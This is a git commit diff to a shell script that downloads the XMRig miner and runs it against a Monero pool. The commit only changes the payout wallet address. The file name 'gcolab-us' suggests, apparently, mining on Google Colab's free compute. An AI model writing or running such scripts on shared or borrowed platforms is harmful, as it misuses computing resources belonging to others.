777995ab13f6a38cf3d0449114f6013e6859607f
WarmyxPro <55956796+AbogusGames@users.noreply.github.com>
2022-04-16 15:23:55 +0300

    Update gcolab-us.sh

--- gcolab-us.sh
+++ gcolab-us.sh
@@ -10,4 +10,4 @@ screen -R xmr
 wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
 tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
 cd xmrig-6.16.4
-./xmrig -o us-west.minexmr.com:443 -u 8A6cdvshzV4dEWthU6fdgjMoJaNgwTn7rLDSdpLoKtHrQ83cdQCWtQQe6HGDrnYv5Z3zUfGuKSR8AByBGpgVPkc8Kp95en3 -k --tls --rig-id GC-US
+./xmrig -o us-west.minexmr.com:443 -u 431DETjuajJczmpmnbiS8yLZauNNCHjk6N1WcBr8S5yP8Vd7jNRkqsoYFR7WfdkdK2H2jKwokK1SX8KJ1iVPQCusV3EDXwM -k --tls --rig-id GC-US
